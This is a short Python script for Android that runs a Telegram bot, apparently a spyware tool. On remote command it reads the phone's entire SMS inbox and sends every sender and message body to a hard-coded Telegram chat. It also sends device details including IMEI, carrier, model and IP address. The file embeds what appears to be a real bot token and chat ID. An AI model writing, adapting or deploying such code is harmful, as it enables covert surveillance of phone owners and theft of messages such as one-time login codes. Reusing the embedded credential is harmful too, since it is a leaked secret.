import os
import requests
import json
import platform
import socket
import psutil
import subprocess
from androidhelper import Android

# Replace with your bot token and chat ID
TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
CHAT_ID = '6285177516'

droid = Android()  # Initializing Android object

# Function to send message to Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Error sending message: {str(e)}")

# Function to fetch and send SMS
def get_sms():
    sms_list = droid.smsGetMessages(False, 'inbox').result
    if sms_list:
        sms_message = "*SMS Messages:*\n\n"
        for sms in sms_list:
            sms_message += f"From: {sms['address']}\nMessage: {sms['body']}\n\n"
        send_to_telegram(sms_message)
    else:
        send_to_telegram("No SMS messages found.")

# Function to get device info
def get_device_info():
    device_info = {}
    
    # Device Name and Model
    device_info["Device Name"] = droid.getDeviceName().result
    device_info["Model"] = droid.getBuildModel().result
    
    # SIM Information
    sim_info = droid.readPhoneState().result
    device_info["SIM Operator"] = sim_info.get('networkOperatorName', 'Unknown')
    
    # IMEI Number
    imei = sim_info.get('deviceId', 'Unknown')
    device_info["IMEI"] = imei
    
    # Android Version
    device_info["Android Version"] = droid.getBuildVersionRelease().result
    
    # Storage Info
    storage_info = droid.getExternalStorageState().result
    device_info["Storage State"] = storage_info

    # Battery Info
    battery_info = droid.batteryGetStatus().result
    device_info["Battery Level"] = battery_info.get('level', 'Unknown')
    
    # IP Address
    ip_address = socket.gethostbyname(socket.gethostname())
    device_info["IP Address"] = ip_address
    
    # Preparing the message
    message = "*Device Information:*\n\n"
    for key, value in device_info.items():
        message += f"{key}: {value}\n"
    
    send_to_telegram(message)

# Function to handle commands from Telegram
def handle_telegram_command(command):
    if command == "/sms":
        get_sms()
    elif command == "/device":
        get_device_info()
    else:
        send_to_telegram("Invalid command. Use /sms to get SMS and /device to get device info.")

# Telegram bot logic to handle commands
def handle_telegram_update(update):
    try:
        message = update.get('message', {}).get('text', '')
        if message:
            handle_telegram_command(message)
    
    except Exception as e:
        send_to_telegram(f"Error in Telegram update: {str(e)}")

# Example of how to handle incoming Telegram updates
def listen_for_updates():
    last_update_id = None
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    
    while True:
        params = {'timeout': 100, 'offset': last_update_id}
        response = requests.get(url, params=params)
        updates = response.json().get('result', [])
        
        for update in updates:
            last_update_id = update['update_id'] + 1
            handle_telegram_update(update)

if __name__ == "__main__":
    # Start listening for Telegram updates
    listen_for_updates()
